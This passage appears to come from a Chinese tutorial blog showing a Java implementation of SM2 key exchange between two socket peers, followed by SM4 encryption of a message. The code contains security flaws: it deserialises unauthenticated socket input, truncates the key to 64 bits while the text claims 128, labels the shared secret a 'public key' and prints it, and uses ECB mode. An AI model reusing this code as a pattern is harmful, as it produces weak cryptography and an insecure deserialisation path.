60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1255.3,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(2255.3,0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></svg></mjx-container>以及A的身份<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.345ex;" xmlns="http://www.w3.org/2000/svg" width="2.933ex" height="1.891ex" role="img" focusable="false" viewBox="0 -683 1296.3 835.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></svg></mjx-container>，然后利用ObjectOutputStream发送给B，并接收从B发来的Negotiation对象，解析后利用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="18.641ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 8239.4 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1261.7,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(2261.7,0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3640.4,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(4640.4,0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5936.7,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(6936.7,0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>计算出共享密钥；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">OutputStream</span> <span class="variable">agree</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">negot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(agree);</span><br><span class="line">negot.writeObject(<span class="keyword">new</span> <span class="title class_">Negotiation</span>(pubK_A,RA,ZA));</span><br><span class="line">negot.flush();</span><br><span class="line"></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">fromB</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">isfromB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fromB);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> isfromB.readObject(); </span><br><span class="line"><span class="type">Negotiation</span> <span class="variable">B</span> <span class="operator">=</span> (Negotiation) obj; </span><br><span class="line"><span class="type">SM2</span> <span class="variable">sm2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM2</span>();</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">pubB</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(B.getpub());</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">R_B</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(B.getR());</span><br><span class="line"><span class="type">byte</span> [] ZB = B.getZ();</span><br><span class="line">String sharedkey= A_EX.computeKey(pubB,R_B,ZA,ZB);</span><br></pre></td></tr></table></figure>

<p>B接收到A发来的Negotiation对象解析后，利用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="18.612ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 8226.7 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1255.3,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(2255.3,0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3627.7,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(4627.7,0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5924,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(6924,0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>计算出共享密钥，然后发送自己的Negotiation对象给A；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">fromA</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">isfromA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fromA);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> isfromA.readObject();</span><br><span class="line"><span class="type">Negotiation</span> <span class="variable">A</span> <span class="operator">=</span> (Negotiation)obj;</span><br><span class="line"><span class="type">SM2</span> <span class="variable">sm2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM2</span>();</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">pubA</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(A.getpub());</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">R_A</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(A.getR());</span><br><span class="line"><span class="type">byte</span> [] ZA = A.getZ();</span><br><span class="line"><span class="type">String</span> <span class="variable">sharedkey</span> <span class="operator">=</span> B_EX.computeKey(pubA,R_A,ZA,ZB);</span><br><span class="line"></span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">agree</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">negot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(agree);</span><br><span class="line">negot.writeObject(<span class="keyword">new</span> <span class="title class_">Negotiation</span>(pubK_B,RB,ZB));</span><br><span class="line">negot.flush();</span><br></pre></td></tr></table></figure>

<p>其中Negotiation类的如下，需要进行Socket传输，继承了一个序列化接口；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Negotiation</span>  <span class="keyword">implements</span> <span class="title class_">Serializable</span>  {</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">byte</span>[] pub;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">byte</span>[] R_;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">byte</span>[] Z_;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Negotiation</span><span class="params">()</span>{</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Negotiation</span> <span class="params">(<span class="type">byte</span>[] pub, <span class="type">byte</span> [] R_,  <span class="type">byte</span>[] Z_)</span> {</span><br><span class="line">    <span class="built_in">this</span>.pub = pub;</span><br><span class="line">    <span class="built_in">this</span>.R_ = R_;</span><br><span class="line">    <span class="built_in">this</span>.Z_ = Z_;</span><br><span class="line">    }</span><br><span class="line">     <span class="keyword">public</span> <span class="type">byte</span>[] getpub() {  </span><br><span class="line">        <span class="keyword">return</span> pub; </span><br><span class="line">    }  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getR() {  </span><br><span class="line">        <span class="keyword">return</span> R_;  </span><br><span class="line">    }  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getZ() {  </span><br><span class="line">        <span class="keyword">return</span> Z_;  </span><br><span class="line">    }    </span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>计算共享密钥的computeKey方法如下：</p>
<ol>
<li><p>获得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.861ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1264.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mn" transform="translate(861,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>；</p>
</li>
<li><p>计算出U的纵横坐标；</p>
</li>
<li><p>利用KDF来生成256比特公钥；</p>
<p>由于A、B接下来使用SM4进行对称加解密，所以暂时只取前128位作为公钥；</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">computeKey</span><span class="params">(ECPoint pubKey_B,ECPoint RB,<span class="type">byte</span>[] Z1,<span class="type">byte</span>[] Z2)</span> {</span><br><span class="line">    <span class="type">BigInteger</span> <span class="variable">x2</span> <span class="operator">=</span> RB.getX().toBigInteger();<span class="comment">//取出RB的横坐标x2</span></span><br><span class="line">    <span class="type">BigInteger</span> <span class="variable">x_2</span> <span class="operator">=</span> computeX(w,x2);</span><br><span class="line">    <span class="type">ECPoint</span> <span class="variable">U</span> <span class="operator">=</span> computePoint(x_2,pubKey_B,RB);</span><br><span class="line">    <span class="comment">//取出U的横坐标ux，为字节数组</span></span><br><span class="line">    ux = Util.byteConvert32Bytes(U.getX().toBigInteger());</span><br><span class="line">    <span class="comment">//取出U的横坐标uy，为字节数组</span></span><br><span class="line">    uy = Util.byteConvert32Bytes(U.getY().toBigInteger());</span><br><span class="line">    <span class="comment">//用于存储KDF产生的256比特共享密钥</span></span><br><span class="line">    <span class="type">byte</span>[] key = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">//计算共享密钥</span></span><br><span class="line">    KDF(key,Z1,Z2);</span><br><span class="line">    <span class="comment">//用于存储前128位共享密钥</span></span><br><span class="line">    <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">    System.arraycopy(key,<span class="number">0</span>,result,<span class="number">0</span>,result.length);</span><br><span class="line">    <span class="comment">//将公钥从字节数组转换为16进制字符串，输出公钥</span></span><br><span class="line">    System.out.print(<span class="string">"public key:"</span>);</span><br><span class="line">    <span class="comment">//将公钥从字节数组转换为16进制字符串，输出公钥</span></span><br><span class="line">    System.out.println(Util.getHexString(result,<span class="literal">true</span>));</span><br><span class="line">    <span class="keyword">return</span> Util.getHexString(result,<span class="literal">true</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></li>
<li><p>AB双方都得到公钥后，A尝试使用SM4算法采用ECB模式加密一条消息发送给B；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">"leeyuxun@163.com"</span>;</span><br><span class="line"><span class="type">SM4Utils</span> <span class="variable">sm4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM4Utils</span>();</span><br><span class="line">sm4.setSecretKey(sharedkey.toString());</span><br><span class="line">sm4.setHexString(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>B收到A发来的密文，尝试用共享密钥利用SM4算法进行解密；</p>
